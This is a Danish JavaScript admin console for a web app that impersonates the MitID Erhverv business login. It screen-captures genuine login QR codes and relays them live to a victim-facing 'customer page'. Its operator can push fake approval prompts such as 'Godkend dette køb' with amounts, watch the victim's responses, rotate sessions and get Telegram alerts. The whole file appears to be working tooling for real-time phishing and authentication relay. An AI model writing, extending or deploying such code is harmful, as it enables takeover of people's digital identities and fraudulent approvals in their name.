/* ════════════════════════════════════════════════════════════
   admin.js — simpel én-fane konsol (MitID Erhverv-stil)
   Kontrol-trin · Egen handling · QR/tekster · Capture · Telegram · Indstillinger
   ════════════════════════════════════════════════════════════ */

let state = null;
let adminPassword = sessionStorage.getItem('adminPassword') || '';

function fmtTime(d){
  if(!d) return '—';
  const dt = new Date(d);
  return dt.toLocaleDateString('da-DK') + ' ' + dt.toLocaleTimeString('da-DK',{hour:'2-digit',minute:'2-digit'});
}

async function apiGet(url){
  const res = await fetch(url, { headers: { 'x-admin-password': adminPassword } });
  if(res.status === 401) throw new Error('unauthorized');
  return res.json();
}

async function apiPost(url, body){
  const res = await fetch(url, {
    method:'POST',
    headers:{'Content-Type':'application/json', 'x-admin-password': adminPassword},
    body: JSON.stringify(body || {})
  });
  if(res.status === 401) throw new Error('unauthorized');
  return res.json();
}

// --- Login (med Telegram-2FA) ---
document.getElementById('loginBtn').addEventListener('click', doLogin);
document.getElementById('loginPassword').addEventListener('keydown', e => { if(e.key === 'Enter') doLogin(); });
const loginCodeInput = document.getElementById('loginCode');
if (loginCodeInput) {
  loginCodeInput.addEventListener('keydown', e => { if(e.key === 'Enter') doVerify(); });
  document.getElementById('loginVerifyBtn').addEventListener('click', doVerify);
}

async function doLogin(){
  const pw = document.getElementById('loginPassword').value;
  const res = await fetch('/api/login', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ password: pw })
  });
  const data = await res.json().catch(() => ({}));
  if (data.ok && data.needsCode) {
    // vis 2FA-trin
    adminPassword = pw;
    sessionStorage.setItem('adminPassword', pw);
    document.getElementById('loginCodeStep').classList.remove('hidden');
    document.getElementById('loginCode').focus();
    document.getElementById('loginCodeMsg').textContent = 'Vi har sendt en 6-cifret kode til din Telegram-bot. Tast den her:';
    document.getElementById('loginError').classList.remove('show');
  } else if (data.ok) {
    adminPassword = pw;
    sessionStorage.setItem('adminPassword', pw);
    showApp();
  } else {
    document.getElementById('loginError').classList.add('show');
  }
}

async function doVerify(){
  const pw = adminPassword;
  const code = document.getElementById('loginCode').value.trim();
  const res = await fetch('/api/login/verify', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ password: pw, code })
  });
  const data = await res.json().catch(() => ({}));
  if (data.ok) {
    showApp();
  } else {
    const msg = document.getElementById('loginCodeMsg');
    if (msg) msg.textContent = data.error || 'Forkert kode — prøv igen:';
    const inp = document.getElementById('loginCode');
    inp.value = '';
    inp.focus();
  }
}

async function showApp(){
  try{
    state = await apiGet('/api/state');
  }catch(e){
    document.getElementById('loginWrap').classList.remove('hidden');
    document.getElementById('adminApp').classList.add('hidden');
    return;
  }
  document.getElementById('loginWrap').classList.add('hidden');
  document.getElementById('adminApp').classList.remove('hidden');
  render();
  connectSocket();
  loadStats();
}

// auto-login med gemt adgangskode (kun hvis 2FA ikke kræver ny kode)
if(adminPassword){
  fetch('/api/login', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ password: adminPassword })
  }).then(r => r.json()).then(data => {
    if (data.ok && !data.needsCode) showApp();
    else if (data.ok && data.needsCode) doLogin(); // send ny kode og vis 2FA-felt
  }).catch(() => {});
}

// --- Socket (instant sync) + poll-opsving ---
function connectSocket(){
  try {
    const socket = io();
    socket.on('admin-state-update', (s) => { state = s; render(); });
  } catch(e) {
    // socket.io utilgængelig — poll-opsvinget herunder dækker
  }
}

setInterval(async () => {
  if (!state || document.hidden) return;
  try {
    state = await apiGet('/api/state');
    render();
    loadStats();
  } catch(e) {}
}, 3000);

// --- Render ---
function render(){
  if(!state) return;
  const setVal = (id, v) => {
    const el = document.getElementById(id);
    if (el && document.activeElement !== el) el.value = (v == null ? '' : v);
  };
  setVal('qrTarget', state.target);
  setVal('sessionId', state.sessionId);
  setVal('lastUpdated', fmtTime(state.lastUpdated));

  const dot = document.getElementById('statusDot');
  const kioskDot = document.getElementById('kioskDot');
  const statusText = document.getElementById('statusText');
  const toggle = document.getElementById('liveToggle');
  const qrBox = document.getElementById('previewQrBox');
  const offlineMsg = document.getElementById('previewOfflineMsg');

  if(kioskDot){
    kioskDot.textContent = 'SESSION · ' + (state.sessionId || '—');
    kioskDot.classList.toggle('live', !!state.live);
  }

  if(state.live){
    dot.classList.add('live');
    statusText.textContent = 'Live — vises på kundesiden';
    toggle.textContent = 'SÆT OFFLINE';
    toggle.classList.add('is-on');
    if(qrBox) qrBox.classList.add('on');
    if(offlineMsg) offlineMsg.style.display = 'none';
    document.getElementById('previewTitle').textContent = state.title || 'Log på hos MitID Erhverv';
    document.getElementById('previewMsg').textContent = state.message || '';
    renderQR();
  } else {
    dot.classList.remove('live');
    statusText.textContent = 'Offline — intet vises';
    toggle.textContent = 'SÆT LIVE';
    toggle.classList.remove('is-on');
    if(qrBox) qrBox.classList.remove('on');
    if(offlineMsg) offlineMsg.style.display = 'block';
    document.getElementById('previewTitle').textContent = '';
    document.getElementById('previewMsg').textContent = '';
    document.getElementById('previewOfflineTitle').textContent = state.offlineTitle || 'Ingen aktiv session';
    document.getElementById('previewOfflineBody').textContent = state.offlineBody || '';
  }

  renderFlow();
  renderRotateUI();
  renderCaptureUrlState();
  renderTelegram();

  setVal('offlineTitle', state.offlineTitle);
  setVal('offlineBody', state.offlineBody);
}

let adminQrInstance = null;
function renderQR(){
  const el = document.getElementById('qrcode');
  if(!el) return;
  el.innerHTML = '';
  const url = state.sessionId
    ? `${window.location.origin}/r/${state.sessionId}`
    : (state.target && state.target.trim() ? state.target.trim() : 'https://mitid-erhverv.dk');
  if (window.QRCodeStyling) {
    adminQrInstance = new QRCodeStyling({
      width: 200, height: 200, type: 'svg', data: url, margin: 6,
      qrOptions: { errorCorrectionLevel: 'M' },
      dotsOptions: { type: 'square', color: '#000000' },
      cornersSquareOptions: { type: 'square', color: '#000000' },
      cornersDotOptions: { type: 'square', color: '#000000' },
      backgroundOptions: { color: '#ffffff' }
    });
    adminQrInstance.append(el);
  } else if (window.QRCode) {
    new QRCode(el, {
      text: url, width: 200, height: 200,
      colorDark: '#000000', colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.M
    });
  }
}

function flashSave(id){
  const el = document.getElementById(id);
  if(!el) return;
  el.classList.add('show');
  setTimeout(()=>el.classList.remove('show'), 1800);
}

// --- Live/QR-mål ---
document.getElementById('liveToggle').addEventListener('click', async ()=>{
  state.live = !state.live;
  render();
  state = await apiPost('/api/state', { live: state.live });
  render();
});

document.getElementById('saveBtn').addEventListener('click', async ()=>{
  const target = document.getElementById('qrTarget').value.trim();
  const title = document.getElementById('stopTitle') ? document.getElementById('stopTitle').value.trim() : '';
  const message = document.getElementById('stopMsg') ? document.getElementById('stopMsg').value.trim() : '';
  state = await apiPost('/api/state', { target, title, message });
  render();
  flashSave('saveMsg');
});

document.getElementById('newSessionBtn').addEventListener('click', async ()=>{
  state = await apiPost('/api/session/new');
  render();
});

document.getElementById('saveSettingsBtn').addEventListener('click', async ()=>{
  const offlineTitle = document.getElementById('offlineTitle').value.trim();
  const offlineBody = document.getElementById('offlineBody').value.trim();
  state = await apiPost('/api/state', { offlineTitle, offlineBody });
  render();
  flashSave('settingsSaveMsg');
});

// --- Stats ---
async function loadStats(){
  try {
    const stats = await apiGet('/api/stats');
    document.getElementById('statTotal').value = stats.totalScans;
    document.getElementById('statToday').value = stats.last24h;
    const rows = document.getElementById('statRows');
    const empty = document.getElementById('statEmpty');
    rows.innerHTML = '';
    if(!stats.recent.length){
      empty.style.display = 'block';
      return;
    }
    empty.style.display = 'none';
    stats.recent.forEach(s => {
      const tr = document.createElement('tr');
      tr.innerHTML = `<td>${fmtTime(s.at)}</td><td>${escapeHtml(s.session)}</td>`;
      rows.appendChild(tr);
    });
  } catch(e) {}
}

function escapeHtml(str){
  const div = document.createElement('div');
  div.textContent = str || '';
  return div.innerHTML;
}

/* ════════════════════════════════════════════════════════════
   FLOW-KNAPPER — kundens trin
   ════════════════════════════════════════════════════════════ */
const FLOW_LABELS = { besked: 'Besked', scan: 'Scan', tekst: 'Viser tekst', action: 'Egen handling', wait: 'Venter', approved: 'Godkendt' };

function renderFlow(){
  if(!state) return;
  const current = state.flow || 'scan';
  ['besked','scan','action','wait','approved'].forEach(f => {
    const btn = document.getElementById('flow' + f.charAt(0).toUpperCase() + f.slice(1) + 'Btn');
    if(!btn) return;
    btn.classList.toggle('current', current === f);
  });
  const cur = document.getElementById('flowCurrent');
  if(cur) cur.textContent = FLOW_LABELS[current] || current;

  // udfyld tekst-feltet fra state
  const tekstEl = document.getElementById('tekstInput');
  if (tekstEl && document.activeElement !== tekstEl) tekstEl.value = state.tekst || '';

  // udfyld action-felter fra state (hvis ikke ved at skrive)
  const a = state.action || {};
  const setVal = (id, v) => {
    const el = document.getElementById(id);
    if (el && document.activeElement !== el) el.value = v || '';
  };
  setVal('actionTitle', a.title);
  setVal('actionAmount', a.amount);
  setVal('actionDetail', a.detail);

  // kundens sidste svar
  const svarEl = document.getElementById('actionSvar');
  if (svarEl) {
    const r = state.actionResponse;
    if (r && Date.now() - r.at < 10 * 60 * 1000) {
      const label = r.response === 'ok' ? '✅ Kunden har GODKENDT' : '❌ Kunden har ANNULLERET';
      svarEl.textContent = label + ' (' + fmtTime(r.at) + ')';
      svarEl.className = 'action-svar show ' + (r.response === 'ok' ? 'ok' : 'cancel');
    } else {
      svarEl.textContent = '';
      svarEl.className = 'action-svar';
    }
  }
}

async function setFlow(flow, action){
  try {
    state = await apiPost('/api/flow', { flow, action });
  } catch(e) {}
  renderFlow();
}

async function actionSendClick(){
  const title  = document.getElementById('actionTitle').value.trim();
  const amount = document.getElementById('actionAmount').value.trim();
  const detail = document.getElementById('actionDetail').value.trim();
  await setFlow('action', { title: title || 'Godkend dette køb', amount, detail });
  flashSave('actionSaveMsg');
}

async function tekstSendClick(){
  const tekst = document.getElementById('tekstInput').value.trim();
  try {
    state = await apiPost('/api/flow', { flow: 'tekst', tekst: tekst || ' ' });
  } catch(e) {}
  renderFlow();
  flashSave('tekstSaveMsg');
}

document.addEventListener('click', function(e){
  const btn = e.target.closest ? e.target.closest('.flow-btn') : null;
  if(btn){
    if(btn.id === 'flowBeskedBtn') return setFlow('besked');
    if(btn.id === 'flowScanBtn') return setFlow('scan');
    if(btn.id === 'flowWaitBtn') return setFlow('wait');
    if(btn.id === 'flowApproveBtn') return setFlow('approved');
    if(btn.id === 'flowActionBtn') return setFlow('action', {
      title: document.getElementById('actionTitle').value.trim(),
      amount: document.getElementById('actionAmount').value.trim(),
      detail: document.getElementById('actionDetail').value.trim()
    });
  }
  if(e.target && e.target.id === 'actionSendBtn') actionSendClick();
  if(e.target && e.target.id === 'tekstSendBtn') tekstSendClick();
});

/* ════════════════════════════════════════════════════════════
   ROTATION (fast kort under Indstillinger)
   ════════════════════════════════════════════════════════════ */
function injectRotateUI(){
  if(document.getElementById('rotateToggle')) return;
  const mount = document.getElementById('rotateMount');
  if(!mount) return;
  const c = document.createElement('div');
  c.innerHTML = [
    '<h2 style="margin:0 0 4px;">Automatisk rotation</h2>',
    '<p class="sub">Skift QR til ny session automatisk hvert X sekunder — gamle screenshots holder ikke.</p>',
    '<div class="status-row"><span class="dot" id="rotateDot"></span><span class="status-text" id="rotateStatusText">Slået fra</span><button class="toggle-btn" id="rotateToggle">SLÅ TIL</button></div>',
    '<label for="rotateInterval">Sekunder</label>',
    '<input type="number" id="rotateInterval" min="3" step="1" placeholder="15">',
    '<div class="btn-row"><button class="btn-primary" id="saveRotateBtn">GEM</button><span class="save-msg" id="rotateSaveMsg">Gemt</span></div>'
  ].join('');
  mount.appendChild(c);
}

async function rotateToggleClick(){
  const r = state.rotate || {enabled:false, intervalSeconds:15};
  const n = parseInt(document.getElementById('rotateInterval').value, 10);
  const s = (Number.isFinite(n) && n >= 3) ? n : (r.intervalSeconds || 15);
  state.rotate = await apiPost('/api/rotate-settings', {enabled: !r.enabled, intervalSeconds: s});
  renderRotateUI();
}

async function rotateSaveClick(){
  const n = parseInt(document.getElementById('rotateInterval').value, 10);
  if(!Number.isFinite(n) || n < 1) return;
  state.rotate = await apiPost('/api/rotate-settings', {enabled: (state.rotate||{}).enabled, intervalSeconds: n});
  renderRotateUI();
  flashSave('rotateSaveMsg');
}

function renderRotateUI(){
  injectRotateUI();
  if(!state || !state.rotate) return;
  const r = state.rotate;
  const d = document.getElementById('rotateDot');
  if(!d) return;
  d.classList.toggle('live', !!r.enabled);
  document.getElementById('rotateStatusText').textContent = r.enabled ? ('Roterer hvert ' + r.intervalSeconds + 's') : 'Slået fra';
  const t = document.getElementById('rotateToggle');
  t.textContent = r.enabled ? 'SLÅ FRA' : 'SLÅ TIL';
  t.classList.toggle('is-on', !!r.enabled);
  const e = document.getElementById('rotateInterval');
  if(document.activeElement !== e) e.value = r.intervalSeconds || 15;
}

document.addEventListener('click', function(e){
  if(e.target && e.target.id === 'rotateToggle') rotateToggleClick();
  if(e.target && e.target.id === 'saveRotateBtn') rotateSaveClick();
});

/* ════════════════════════════════════════════════════════════
   CAPTURE — skærmdeling (hurtig pipeline: 110ms dekodning,
   400ms debounce, øjeblikkelig socket-push til kunden)
   ════════════════════════════════════════════════════════════ */
let captureStream = null;
let captureScanning = false;
let captureRafId = null;
let capturePushEnabled = false;
let captureLastPushed = null;
let captureLastPushAt = 0;
let captureLastScanAt = 0;
const captureCanvas = document.createElement('canvas');
const captureCtx = captureCanvas.getContext('2d', { willReadFrequently: true });

document.getElementById('captureStartBtn').addEventListener('click', startScreenShare);
document.getElementById('captureStopBtn').addEventListener('click', stopScreenShare);
document.getElementById('capturePushToggle').addEventListener('click', toggleCapturePush);

async function startScreenShare(){
  clearCaptureErr();
  const video = document.getElementById('screenVideo');
  try {
    // MAKS HASTIGHED: bed om 30fps fra kilden (browseren leverer det den kan)
    captureStream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: { ideal: 30 } }, audio: false });
  } catch(e) {
    showCaptureErr('Kunne ikke starte skærmdeling. Vælg det vindue hvor QR-koden vises, og prøv igen.');
    return;
  }
  video.srcObject = captureStream;
  await video.play();
  captureStream.getVideoTracks()[0].addEventListener('ended', stopScreenShare);

  document.getElementById('screenPlaceholder').style.display = 'none';
  document.getElementById('captureStartBtn').style.display = 'none';
  document.getElementById('captureStopBtn').style.display = 'inline-flex';
  setCaptureStatus(true, 'Søger efter QR-kode ...');

  captureScanning = true;
  captureScanLoop();
}

function stopScreenShare(){
  captureScanning = false;
  if(captureRafId) clearTimeout(captureRafId);
  captureRafId = null;
  if(captureStream) captureStream.getTracks().forEach(t=>t.stop());
  captureStream = null;
  const video = document.getElementById('screenVideo');
  if(video) video.srcObject = null;
  const ph = document.getElementById('screenPlaceholder');
  if(ph) ph.style.display = 'flex';
  document.getElementById('captureStartBtn').style.display = 'inline-flex';
  document.getElementById('captureStopBtn').style.display = 'none';
  setCaptureStatus(false, 'Skærmdeling stoppet');
}

function captureScanLoop(){
  if(!captureScanning) return;
  const video = document.getElementById('screenVideo');
  // MAKS HASTIGHED: adaptiv dekodning — kør hurtigst muligt men uden at spilde
  // CPU: 60ms interval (≈16 scans/sek), nedskaleret til max 800px for skarphed.
  // setTimeout i stedet for requestAnimationFrame: virker også når fanen er i
  // baggrunden (RAF pauser), så capture altid kører.
  const now = performance.now();
  if(video && video.readyState === video.HAVE_ENOUGH_DATA && now - captureLastScanAt >= 60){
    const w = video.videoWidth, h = video.videoHeight;
    if(w && h){
      const scale = Math.min(1, 800 / Math.max(w, h));
      const tw = Math.max(1, Math.round(w * scale)), th = Math.max(1, Math.round(h * scale));
      if(captureCanvas.width !== tw || captureCanvas.height !== th){
        captureCanvas.width = tw; captureCanvas.height = th;
      }
      captureCtx.drawImage(video, 0, 0, tw, th);
      const img = captureCtx.getImageData(0, 0, tw, th);
      const code = window.jsQR(img.data, tw, th, { inversionAttempts: 'attemptBoth' });
      if(code && code.data){
        onCaptureDecoded(code.data);
      }
    }
    captureLastScanAt = now;
  }
  captureRafId = setTimeout(captureScanLoop, 30);
}

function onCaptureDecoded(value){
  const readEl = document.getElementById('captureReadValue');
  if(readEl) readEl.value = value;
  setCaptureStatus(true, 'Kode aflæst');
  if(!capturePushEnabled) return;
  const now = Date.now();
  // HURTIGHED: debounce 250ms — nye koder når kunden hurtigst muligt
  if(value === captureLastPushed && now - captureLastPushAt < 250) return;
  captureLastPushed = value;
  captureLastPushAt = now;
  pushCaptureToDisplay(value);
}

async function pushCaptureToDisplay(value){
  try{
    const res = await fetch('/api/capture-push', {
      method:'POST',
      headers:{'Content-Type':'application/json','x-admin-password':adminPassword},
      body: JSON.stringify({ target: value })
    });
    if(res.ok){
      setCaptureStatus(true, 'Sendt til kundeside ✓');
    } else {
      showCaptureErr('Kunne ikke sende til kundesiden. Er du stadig logget ind?');
    }
  }catch(e){
    showCaptureErr('Netværksfejl ved afsendelse til kundesiden.');
  }
}

function toggleCapturePush(){
  capturePushEnabled = !capturePushEnabled;
  const toggleBtn = document.getElementById('capturePushToggle');
  const statusEl = document.getElementById('capturePushStatus');
  if(toggleBtn) toggleBtn.textContent = capturePushEnabled ? 'SEND TIL KUNDESIDE: TIL' : 'SEND TIL KUNDESIDE: FRA';
  if(statusEl) statusEl.textContent = capturePushEnabled
    ? 'Sender aflæst kode live til kundesiden — opdaterer øjeblikkeligt'
    : 'Sender ikke til kundesiden';
  if(capturePushEnabled && captureLastPushed === null){
    const cur = document.getElementById('captureReadValue').value;
    if(cur && cur !== '-'){ captureLastPushed = cur; captureLastPushAt = Date.now(); pushCaptureToDisplay(cur); }
  }
}

function setCaptureStatus(active, text){
  const dot = document.getElementById('captureDot');
  const textEl = document.getElementById('captureStatusText');
  if(!dot) return;
  dot.classList.toggle('live', !!active);
  if(textEl) textEl.textContent = text;
}

function showCaptureErr(msg){
  const el = document.getElementById('captureErr');
  if(el) el.textContent = msg;
}
function clearCaptureErr(){
  const el = document.getElementById('captureErr');
  if(el) el.textContent = '';
}

window.addEventListener('pagehide', stopScreenShare);

// --- Capture fra URL ---
document.getElementById('captureFetchNowBtn').addEventListener('click', captureFetchNow);
document.getElementById('captureSaveUrlBtn').addEventListener('click', captureSaveUrl);
document.getElementById('captureAutoToggle').addEventListener('click', captureToggleAuto);

async function captureFetchNow(){
  const url = document.getElementById('captureSourceUrl').value.trim();
  if(!url){ showCaptureUrlErr('Indsæt en URL først.'); return; }
  clearCaptureUrlErr();
  const btn = document.getElementById('captureFetchNowBtn');
  const original = btn.textContent;
  btn.textContent = 'Henter ...';
  btn.disabled = true;
  try{
    const res = await fetch('/api/capture-url', {
      method:'POST',
      headers:{'Content-Type':'application/json','x-admin-password':adminPassword},
      body: JSON.stringify({ url })
    });
    const data = await res.json();
    if(!res.ok){
      showCaptureUrlErr(data.error || 'Kunne ikke hente QR-koden.');
    }
  }catch(e){
    showCaptureUrlErr('Netværksfejl ved hentning.');
  }finally{
    btn.textContent = original;
    btn.disabled = false;
  }
}

async function captureSaveUrl(){
  const url = document.getElementById('captureSourceUrl').value.trim();
  await apiPost('/api/capture-settings', { sourceUrl: url });
}

async function captureToggleAuto(){
  const url = document.getElementById('captureSourceUrl').value.trim();
  if(!url){ showCaptureUrlErr('Indsæt og gem en URL, før du slår automatisk opdatering til.'); return; }
  const toggleBtn = document.getElementById('captureAutoToggle');
  const turningOn = ['Slå til','SLÅ TIL','Slaa til'].includes(toggleBtn.textContent.trim());
  await apiPost('/api/capture-settings', { sourceUrl: url, enabled: turningOn });
  state = await apiGet('/api/state');
  render();
}

function renderCaptureUrlState(){
  if(!state || !state.capture) return;
  const c = state.capture;
  const urlEl = document.getElementById('captureSourceUrl');
  if(urlEl && document.activeElement !== urlEl) urlEl.value = c.sourceUrl || '';

  const toggleBtn = document.getElementById('captureAutoToggle');
  if(toggleBtn){
    toggleBtn.textContent = c.enabled ? 'SLÅ FRA' : 'SLÅ TIL';
    toggleBtn.classList.toggle('is-on', !!c.enabled);
  }

  const statusEl = document.getElementById('captureUrlStatus');
  if(statusEl){
    statusEl.value = c.lastError ? c.lastError : (c.lastCheckedAt ? 'Hentet korrekt' : 'Ikke hentet endnu');
  }
  const checkedEl = document.getElementById('captureUrlChecked');
  if(checkedEl){
    checkedEl.value = c.lastCheckedAt ? fmtTime(c.lastCheckedAt) : '-';
  }
}

function showCaptureUrlErr(msg){
  const el = document.getElementById('captureUrlErr');
  if(el) el.textContent = msg;
}
function clearCaptureUrlErr(){
  const el = document.getElementById('captureUrlErr');
  if(el) el.textContent = '';
}

/* ════════════════════════════════════════════════════════════
   TELEGRAM-NOTIFIKATIONER
   ════════════════════════════════════════════════════════════ */
function renderTelegram(){
  if(!state || !state.telegram) return;
  const t = state.telegram;
  const dot = document.getElementById('telegramDot');
  const textEl = document.getElementById('telegramStatusText');
  const toggleBtn = document.getElementById('telegramToggle');
  if(!dot || !textEl || !toggleBtn) return;

  const ready = !!(t.enabled && t.hasToken && t.hasChatId);
  dot.classList.toggle('live', !!t.enabled);
  dot.classList.toggle('warn', !!t.enabled && !ready);
  textEl.textContent = !t.enabled ? 'Slået fra'
    : (!ready ? 'Slået til — men mangler token/chat-ID' : 'Aktiv — sender notifikationer');
  toggleBtn.textContent = t.enabled ? 'SLÅ FRA' : 'SLÅ TIL';
  toggleBtn.classList.toggle('is-on', !!t.enabled);

  const tokEl = document.getElementById('telegramToken');
  if (tokEl && document.activeElement !== tokEl) {
    if (t.hasToken) { tokEl.value = ''; tokEl.placeholder = 'Gemt ✓ (skriv for at skifte)'; }
    else { tokEl.placeholder = '123456789:AAE... (fra @BotFather)'; }
  }
  const chatEl = document.getElementById('telegramChatId');
  if (chatEl && document.activeElement !== chatEl && t.hasChatId) {
    chatEl.placeholder = 'Gemt ✓ (skriv for at skifte)';
  }

  document.getElementById('telegramLastSent').textContent = fmtTime(t.lastSentAt);
  document.getElementById('telegramSentCount').textContent = t.sentCount || 0;
  const errEl = document.getElementById('telegramErr');
  if (t.lastError) { errEl.textContent = 'Fejl: ' + t.lastError; errEl.className = 'tg-err'; }
  else if (ready)  { errEl.textContent = 'OK'; errEl.className = 'tg-ok'; }
  else             { errEl.textContent = '—'; errEl.className = ''; }
}

async function telegramToggleClick(){
  const token = document.getElementById('telegramToken').value.trim();
  const chatId = document.getElementById('telegramChatId').value.trim();
  const body = { enabled: !(state.telegram||{}).enabled };
  if (token) body.token = token;
  if (chatId) body.chatId = chatId;
  state.telegram = await apiPost('/api/telegram-settings', body);
  renderTelegram();
}

async function telegramSaveClick(){
  const token = document.getElementById('telegramToken').value.trim();
  const chatId = document.getElementById('telegramChatId').value.trim();
  const body = {};
  if (token) body.token = token;
  if (chatId) body.chatId = chatId;
  if (!token && !chatId) { renderTelegram(); return; }
  state.telegram = await apiPost('/api/telegram-settings', body);
  document.getElementById('telegramToken').value = '';
  document.getElementById('telegramChatId').value = '';
  renderTelegram();
  flashSave('telegramSaveMsg');
}

async function telegramTestClick(){
  const btn = document.getElementById('telegramTestBtn');
  const original = btn.textContent;
  btn.textContent = 'SENDER ...'; btn.disabled = true;
  try {
    state.telegram = await apiPost('/api/telegram-test', {});
  } catch(e) {}
  btn.textContent = original; btn.disabled = false;
  renderTelegram();
}

document.addEventListener('click', function(e){
  if(e.target && e.target.id === 'telegramToggle') telegramToggleClick();
  if(e.target && e.target.id === 'telegramSaveBtn') telegramSaveClick();
  if(e.target && e.target.id === 'telegramTestBtn') telegramTestClick();
});

/* ════════════════════════════════════════════════════════════
   PRESET-CHIPS — færdiglavede handlinger (klik = udfyld + vis)
   ════════════════════════════════════════════════════════════ */
document.addEventListener('click', async function(e){
  const chip = e.target.closest ? e.target.closest('.preset-chip') : null;
  if(!chip) return;
  const title = chip.dataset.presetTitle;
  const focusId = chip.dataset.presetFocus;
  document.getElementById('actionTitle').value = title;
  const amountEl = document.getElementById('actionAmount');
  if (focusId === 'actionAmount' && !amountEl.value.trim()) {
    amountEl.focus();
  }
  // vis straks på kundesiden med preset-teksten
  await setFlow('action', {
    title,
    amount: document.getElementById('actionAmount').value.trim(),
    detail: document.getElementById('actionDetail').value.trim()
  });
  flashSave('actionSaveMsg');
});